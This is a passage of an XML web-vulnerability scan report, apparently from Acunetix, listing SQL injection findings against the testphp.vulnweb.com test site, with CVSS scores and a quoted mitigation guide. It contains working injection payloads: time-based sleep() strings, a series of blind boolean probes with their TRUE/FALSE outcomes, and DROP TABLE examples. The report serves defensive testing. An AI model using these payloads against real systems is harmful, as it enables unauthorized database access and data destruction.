       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /search.php?test=(select(0)from(select(sleep(0)))v)/*'%2b(select(0)from(select(sleep(0)))v)%2b'&quot;%2b(select(0)from(select(sleep(0)))v)%2b&quot;*/ HTTP/1.1
Content-Length: 22
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

goButton=go&amp;searchFor=]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:59 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 6572
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="78" color="red">
       <Name><![CDATA[Blind SQL Injection]]></Name>
       <ModuleName><![CDATA[Scripting (Blind_Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">uuname</font></b> was set to <b><font color="dark">-1' OR 3*2*1=6 AND 000237=000237 -- </font></b><br/><br/>Tests performed: <ul><li>-1' OR 2+237-237-1=0+0+0+1 --  =&gt; <b>TRUE</b></li><li>-1' OR 3+237-237-1=0+0+0+1 --  =&gt; <b>FALSE</b></li><li>-1' OR 3*2&lt;(0+5+237-237) --  =&gt; <b>FALSE</b></li><li>-1' OR 3*2&gt;(0+5+237-237) --  =&gt; <b>FALSE</b></li><li>-1' OR 2+1-1-1=1 AND 000237=000237 --  =&gt; <b>TRUE</b></li><li>-1' OR 000237=000237 AND 3+1-1-1=1 --  =&gt; <b>FALSE</b></li><li>-1' OR 3*2=5 AND 000237=000237 --  =&gt; <b>FALSE</b></li><li>-1' OR 3*2=6 AND 000237=000237 --  =&gt; <b>TRUE</b></li><li>-1' OR 3*2*0=6 AND 000237=000237 --  =&gt; <b>FALSE</b></li><li>-1' OR 3*2*1=6 AND 000237=000237 --  =&gt; <b>TRUE</b></li></ul><br/> Original value: <b>lkmfkchf</b>]]></Details>
       <Affects><![CDATA[/secured/newuser.php]]></Affects>
       <Parameter><![CDATA[uuname]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /secured/newuser.php HTTP/1.1
Content-Length: 231
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

signup=signup&amp;uaddress=3137%20Laguna%20Street&amp;ucc=4111111111111111&amp;uemail=sample%40email.tst&amp;upass=g00dPa%24%24w0rD&amp;upass2=g00dPa%24%24w0rD&amp;uphone=555-666-0606&amp;urname=lkmfkchf&amp;uuname=-1'%20OR%203*2*1=6%20AND%20000237=000237%20--%20]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:59 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 536
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="79" color="red">
       <Name><![CDATA[Blind SQL Injection]]></Name>
       <ModuleName><![CDATA[Scripting (Blind_Sql_Injection.script)]]></ModuleName>
